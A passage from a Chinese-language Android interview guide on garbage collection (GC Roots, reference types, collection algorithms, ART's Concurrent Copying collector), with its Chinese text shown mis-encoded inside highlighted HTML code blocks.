<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;
node2.next = node1;  <span class="hljs-comment">// å¾ªç¯å¼•ç”¨</span>

<span class="hljs-comment">// å¦‚æœnode1å’Œnode2éƒ½ä¸å†è¢«GC Rootså¼•ç”¨</span>
<span class="hljs-comment">// å³ä½¿å®ƒä»¬ç›¸äº’å¼•ç”¨ï¼Œä¹Ÿæ— æ³•ä»GC Rootsåˆ°è¾¾</span>
<span class="hljs-comment">// æ‰€ä»¥å®ƒä»¬éƒ½æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<p><strong>5. GC Rootså¯¹è±¡æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>GC Rootsæ˜¯å¯è¾¾æ€§åˆ†æç®—æ³•çš„èµ·ç‚¹ï¼Œä»¥ä¸‹å¯¹è±¡å¯ä»¥ä½œä¸ºGC Rootsï¼š</p>
<ol>
<li>
<p><strong>è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°</li>
<li>ç¤ºä¾‹ï¼šæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¼•ç”¨çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>æ–¹æ³•åŒºä¸­é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>staticå˜é‡</li>
<li>ç¤ºä¾‹ï¼šç±»çš„é™æ€å˜é‡</li>
</ul>
</li>
<li>
<p><strong>æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>å¸¸é‡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²å¸¸é‡</li>
</ul>
</li>
<li>
<p><strong>æœ¬åœ°æ–¹æ³•æ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>Nativeæ–¹æ³•ä¸­çš„å¼•ç”¨</li>
<li>ç¤ºä¾‹ï¼šJNIè°ƒç”¨ä¸­çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŒæ­¥é”æŒæœ‰çš„å¯¹è±¡</strong></p>
<ul>
<li>synchronizedæŒæœ‰çš„å¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šé”å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å†…éƒ¨å¼•ç”¨</strong></p>
<ul>
<li>Classå¯¹è±¡ã€å¼‚å¸¸å¯¹è±¡ç­‰</li>
<li>ç¤ºä¾‹ï¼šç±»çš„Classå¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆè¿™äº›æ˜¯GC Rootsï¼Ÿ</strong></p>
<ul>
<li>è¿™äº›å¯¹è±¡æ˜¯ç¨‹åºè¿è¡Œçš„åŸºç¡€ï¼Œä¸èƒ½è¢«å›æ”¶</li>
<li>ä»è¿™äº›å¯¹è±¡å¼€å§‹ï¼Œå¯ä»¥æ‰¾åˆ°æ‰€æœ‰æ­£åœ¨ä½¿ç”¨çš„å¯¹è±¡</li>
<li>æ— æ³•ä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡ï¼Œè¯´æ˜ç¨‹åºä¸å†ä½¿ç”¨ï¼Œå¯ä»¥å›æ”¶</li>
</ul>
<p><strong>6. å¼•ç”¨ç±»å‹æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Javaä¸­æœ‰å››ç§å¼•ç”¨ç±»å‹ï¼Œå¼ºåº¦ä»å¼ºåˆ°å¼±ï¼š</p>
<p><strong>1. å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæœ€å¸¸è§çš„å¼•ç”¨ç±»å‹ï¼Œåªè¦å¼ºå¼•ç”¨å­˜åœ¨ï¼Œå¯¹è±¡å°±ä¸ä¼šè¢«GCå›æ”¶</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šæ™®é€šå¯¹è±¡å¼•ç”¨ã€Activityå¼•ç”¨ç­‰</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼ºå¼•ç”¨</span>
<span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œé™¤éobj = null</span>
</code></pre>
<p><strong>2. è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå†…å­˜ä¸è¶³æ—¶æ‰å›æ”¶ï¼Œé€‚åˆç¼“å­˜åœºæ™¯</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šAndroidä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè®¾å¤‡å†…å­˜æœ‰é™ï¼Œè½¯å¼•ç”¨å¯èƒ½å¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å»ºè®®</strong>ï¼šä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java">SoftReference&lt;Bitmap&gt; softRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(bitmap);
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> softRef.get();  <span class="hljs-comment">// å¯èƒ½è¿”å›nullï¼ˆå¦‚æœè¢«å›æ”¶äº†ï¼‰</span>
</code></pre>
<p><strong>3. å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåªè¦GCå°±ä¼šå›æ”¶ï¼Œä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶</li>
<li><strong>Androidä½¿ç”¨åœºæ™¯</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ï¼ˆHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶ï¼‰</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¿å…Handlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<p><strong>4. è™šå¼•ç”¨ï¼ˆPhantom Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæœ€å¼±çš„å¼•ç”¨ç±»å‹ï¼Œä¸»è¦ç”¨äºå¯¹è±¡å›æ”¶å‰çš„æ¸…ç†å·¥ä½œ</li>
<li><strong>Androidä½¿ç”¨åœºæ™¯</strong>ï¼šå¾ˆå°‘ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºç‰¹æ®Šåœºæ™¯</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ— æ³•é€šè¿‡è™šå¼•ç”¨è·å–å¯¹è±¡</li>
</ul>
<p><strong>å¼•ç”¨å¼ºåº¦å¯¹æ¯”ï¼š</strong>
å¼ºå¼•ç”¨ &gt; è½¯å¼•ç”¨ &gt; å¼±å¼•ç”¨ &gt; è™šå¼•ç”¨</p>
<h4 data-id="heading-77">6.1.2 åƒåœ¾å›æ”¶ç®—æ³•</h4>
<p><strong>1. åƒåœ¾å›æ”¶ç®—æ³•æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ç®—æ³•ä¸»è¦æœ‰å››ç§ï¼š</p>
<p><strong>1. æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå…ˆæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œç„¶åæ¸…é™¤</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šä¸ä¸»è¦ä½¿ç”¨</li>
</ul>
<p><strong>2. æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆMark-Copyï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œå›æ”¶æ—¶å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ²¡æœ‰å†…å­˜ç¢ç‰‡ï¼Œä½†æµªè´¹å†…å­˜</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼š<strong>ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong>ï¼Œé€‚åˆå¹´è½»ä»£</li>
</ul>
<p><strong>3. æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆMark-Compactï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šæ ‡è®°åï¼Œå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ²¡æœ‰å†…å­˜ç¢ç‰‡ä¸”ä¸æµªè´¹å†…å­˜ï¼Œä½†æ•ˆç‡è¾ƒä½</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šåœ¨æŸäº›åœºæ™¯ä½¿ç”¨ï¼Œç”¨äºè€å¹´ä»£</li>
</ul>
<p><strong>4. åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆGenerational Collectionï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šæ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¹´è½»ä»£å’Œè€å¹´ä»£ï¼Œä¸åŒä»£ç”¨ä¸åŒç®—æ³•</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šç»“åˆå¤šç§ç®—æ³•çš„ä¼˜ç‚¹</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šä½¿ç”¨è¿™ä¸ªç­–ç•¥</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆAndroidä¸»è¦ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼Ÿ</strong></p>
<ul>
<li>é€‚åˆå¹´è½»ä»£ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
<li>æ²¡æœ‰å†…å­˜ç¢ç‰‡ï¼šå¤åˆ¶åå†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>2. æ ‡è®°-æ¸…é™¤ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…é™¤æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>ä¸éœ€è¦ç§»åŠ¨å¯¹è±¡</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>äº§ç”Ÿå†…å­˜ç¢ç‰‡</strong>ï¼šæ¸…é™¤åç•™ä¸‹ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ä¸¤æ¬¡éå†ï¼ˆæ ‡è®°å’Œæ¸…é™¤ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidä¸ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</li>
<li>å› ä¸ºä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ ‡è®°å‰ï¼š<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
        å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾   å­˜æ´»

æ¸…é™¤åï¼š<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
        ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½
</code></pre>
<p><strong>3. æ ‡è®°-å¤åˆ¶ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
å°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨ä¸€å—ã€‚å›æ”¶æ—¶ï¼Œå°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ï¼Œç„¶åæ¸…ç©ºå½“å‰å—ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šå¤åˆ¶åå†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜</li>
<li><strong>å›æ”¶æ•ˆç‡é«˜</strong>ï¼šåªéœ€è¦å¤åˆ¶å­˜æ´»å¯¹è±¡ï¼Œå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
<li><strong>é€‚åˆå¹´è½»ä»£</strong>ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æµªè´¹å†…å­˜ï¼šéœ€è¦ä¸¤å—å†…å­˜ï¼Œä½†åªä½¿ç”¨ä¸€å—</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜æ—¶æ•ˆç‡ä½ï¼šéœ€è¦å¤åˆ¶å¾ˆå¤šå¯¹è±¡</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li><strong>Android ARTä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong></li>
<li>é€‚åˆå¹´è½»ä»£å›æ”¶ï¼ˆå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼‰</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼ˆè€Œä¸æ˜¯50%ï¼‰</li>
</ul>
<p><strong>æ”¹è¿›ç®—æ³•ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
<li>å°†å†…å­˜åˆ†ä¸ºEdenåŒºå’Œä¸¤ä¸ªSurvivoråŒº</li>
<li>é»˜è®¤æ¯”ä¾‹ï¼šEden : Survivor0 : Survivor1 = 8 : 1 : 1</li>
<li>åªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>4. æ ‡è®°-æ•´ç†ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
åˆ†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ•´ç†é˜¶æ®µ</strong>ï¼šå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>ä¸æµªè´¹å†…å­˜</strong>ï¼šä¸éœ€è¦ä¸¤å—å†…å­˜</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>é€‚åˆè€å¹´ä»£ï¼šå¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidåœ¨æŸäº›åœºæ™¯ä¸‹ä½¿ç”¨</li>
<li>ä¸»è¦ç”¨äºè€å¹´ä»£å›æ”¶ï¼ˆé¿å…å†…å­˜ç¢ç‰‡ï¼‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆè€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ï¼Ÿ</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
<li>é¿å…å†…å­˜ç¢ç‰‡ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
<li>ä¸æµªè´¹å†…å­˜ï¼ˆä¸åƒæ ‡è®°-å¤åˆ¶éœ€è¦ä¸¤å—å†…å­˜ï¼‰</li>
</ul>
<p><strong>5. åˆ†ä»£æ”¶é›†ç®—æ³•çš„åŸç†ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç†è®ºåŸºç¡€ï¼š</strong>
æ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œå°†å†…å­˜åˆ†ä¸ºä¸åŒçš„ä»£ï¼š</p>
<ul>
<li><strong>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­</strong>ï¼šåˆ›å»ºåå¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å°‘æ•°å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿</strong>ï¼šé•¿æœŸå­˜æ´»</li>
</ul>
<p><strong>åˆ†ä»£ç­–ç•¥ï¼š</strong></p>
<p><strong>å¹´è½»ä»£ï¼ˆYoung Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆå¿«é€Ÿé«˜æ•ˆï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šPartial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆé¿å…ç¢ç‰‡ï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šFull GCï¼ˆå®Œå…¨å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„åˆ†ä»£æ”¶é›†ï¼š</strong></p>
<ol>
<li><strong>å¹´è½»ä»£ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong>ï¼šå¿«é€Ÿå›æ”¶ï¼Œé€‚åˆé¢‘ç¹å›æ”¶</li>
<li><strong>è€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ç®—æ³•</strong>ï¼šé¿å…å†…å­˜ç¢ç‰‡</li>
<li><strong>è¿™æ ·è®¾è®¡çš„å¥½å¤„</strong>ï¼šæé«˜GCæ•ˆç‡ï¼Œå‡å°‘GCæš‚åœæ—¶é—´ï¼Œå‡å°‘å†…å­˜ç¢ç‰‡</li>
</ol>
<p><strong>å¯¹è±¡æ™‹å‡è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡ â†’ å¹´è½»ä»£ï¼ˆEdenåŒºï¼‰
<span class="hljs-bullet">2.</span> å¹´è½»ä»£GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCåä»å­˜æ´» â†’ æ™‹å‡åˆ°è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£GC â†’ å›æ”¶é•¿æœŸå­˜æ´»çš„å¯¹è±¡
</code></pre>
<h4 data-id="heading-78">6.1.3 Android GCåŸºç¡€</h4>
<p><strong>1. Androidä½¿ç”¨çš„åƒåœ¾å›æ”¶å™¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨çš„åƒåœ¾å›æ”¶å™¨æ˜¯<strong>å¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼Œç®€ç§°CCï¼‰</strong>ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ä¸ªæ”¶é›†å™¨</strong>ï¼šAndroidåªæœ‰è¿™ä¸€ç§æ”¶é›†å™¨</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨è¿™ä¸ªæ”¶é›†å™¨</li>
<li><strong>æ²¡æœ‰å¤šç§å¯é€‰</strong>ï¼šä¸åƒJVMæœ‰Serialã€Parallelã€CMSã€G1ã€ZGCç­‰å¤šç§å¯é€‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªï¼Ÿ</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼šä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼šç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
</ul>
<p><strong>æ”¶é›†å™¨çš„ç‰¹æ€§ï¼š</strong></p>
<ul>
<li>åˆ†ä»£å›æ”¶ï¼šå¹´è½»ä»£å’Œè€å¹´ä»£</li>
<li>å¹¶å‘å›æ”¶ï¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œå‡å°‘ä¸»çº¿ç¨‹æš‚åœ</li>
<li>å¤åˆ¶ç®—æ³•ï¼šé€‚åˆå¹´è½»ä»£ï¼Œæ²¡æœ‰å†…å­˜ç¢ç‰‡</li>
<li>å¢é‡å›æ”¶ï¼šæŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œé¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</li>
<li>å‹ç¼©å›æ”¶ï¼šå›æ”¶åæ•´ç†å†…å­˜ï¼Œé¿å…å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>2. Androidæœ‰å‡ ç§åƒåœ¾å›æ”¶å™¨å¯é€‰ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>Androidæ²¡æœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼Œåªæœ‰ä¸€ç§ã€‚</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ç§</strong>ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼ŒCCï¼‰</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</li>
<li><strong>ä¸éœ€è¦é…ç½®</strong>ï¼šä¸åƒJVMéœ€è¦é…ç½®-XX:+UseXXXå‚æ•°</li>
</ul>
<p><strong>ä¸JVMçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCã€Shenandoahç­‰ï¼‰ï¼Œéœ€è¦å¼€å‘è€…æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©</li>
<li><strong>Android</strong>ï¼šåªæœ‰ä¸€ç§ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œé’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä¸éœ€è¦å¤šç§å¯é€‰ï¼Ÿ</strong></p>
<ul>
<li>Androidåº”ç”¨çš„ç‰¹ç‚¹ç›¸ä¼¼ï¼šéƒ½æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>ç³»ç»Ÿè‡ªåŠ¨ä¼˜åŒ–ï¼šé’ˆå¯¹Androidåœºæ™¯å·²ç»ä¼˜åŒ–å¥½äº†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«å’Œé€‰æ‹©</li>
</ul>
<p><strong>3. Partial GCå’ŒFull GCçš„åŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>Partial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
